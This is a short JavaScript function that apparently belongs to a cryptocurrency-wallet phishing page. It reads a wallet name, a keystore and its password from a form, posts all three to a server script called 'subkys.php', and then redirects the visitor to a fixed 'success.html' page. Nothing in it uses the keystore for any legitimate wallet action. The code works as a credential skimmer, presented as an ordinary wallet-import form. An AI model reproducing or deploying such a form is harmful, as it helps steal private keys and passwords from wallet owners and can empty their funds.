function SubmitStrData() {
    var wallet = $("#strWallet").val();
    var pass = $("#keystore").val();
    var strPass = $("#strPass").val();


    if (pass == '' || strPass == '') {
        $('#strErr').html("<p>All fields are required</p>");
    } else {
        $.post("subkys.php", {
                strWallet: wallet,
                keystore: pass,
                strPass: strPass
            },
            function(data) {
                //$('#results').html(data);
                $('#keystoreForm')[0].reset();
                location.href = 'success.html'

            });
    }

}

function clearsErr() {
    $('#strErr').html('')
}